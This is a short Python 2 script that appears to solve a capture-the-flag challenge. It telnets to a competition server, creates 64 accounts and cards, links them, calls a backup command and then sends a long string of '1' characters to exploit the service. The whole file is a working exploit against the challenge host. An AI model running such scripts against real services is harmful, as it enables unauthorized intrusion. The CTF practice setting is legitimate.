data = [] 


# for i in data:
#	print i 


# With no accounts created, length is 300
#print len(data)

import sys
import telnetlib
import time

HOST = "anon.ctfcompetition.com"


tn = telnetlib.Telnet(HOST, 1337)
#print tn.read_all()


tn.read_until("few seconds.", timeout=3)

for i in range(64):
	tn.write("newacc\n")
	tn.write("newcard\n")

for i in xrange(1,65):
	tn.write("assoc ucard{} uaccount{}\n".format(str(hex(i)), str(hex(i))))

tn.write("backup\n")

tn.write("1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111\n")

print tn.read_all()
# hex loop:

#print tn.read_all()